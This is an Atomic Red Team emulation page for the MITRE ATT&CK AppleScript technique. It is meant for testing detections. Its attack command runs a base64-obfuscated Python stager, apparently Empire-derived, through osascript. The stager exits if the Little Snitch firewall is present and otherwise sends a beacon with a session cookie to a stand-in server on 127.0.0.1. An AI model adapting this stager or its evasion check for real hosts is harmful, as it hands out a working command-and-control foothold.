# T1059.002 - Command and Scripting Interpreter: AppleScript
Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. (Citation: Apple AppleScript) These AppleEvent messages can be easily scripted with AppleScript for local or remote execution.

<code>osascript</code> executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang</code> program. AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

Adversaries can use this to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006)(Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e "script here"</code>.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - AppleScript
Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of "t3VhVOs/DyCcDTFzIKanRxkvk3I=", unless 'Little Snitch' is installed, in which case it will just exit. 
You can use netcat to listen for the connection and verify execution, e.g. use "nc -l 80" in another terminal window before executing this test and watch for the request.

Reference: https://github.com/EmpireProject/Empire

**Supported Platforms:** macos
#### Attack Commands: Run with `sh`
```sh
osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\" | python &\""
```

Invoke-AtomicTest T1059.002 -TestNumbers 1

## Detection
Monitor for execution of AppleScript through osascript that may be related to other suspicious behavior occurring on the system.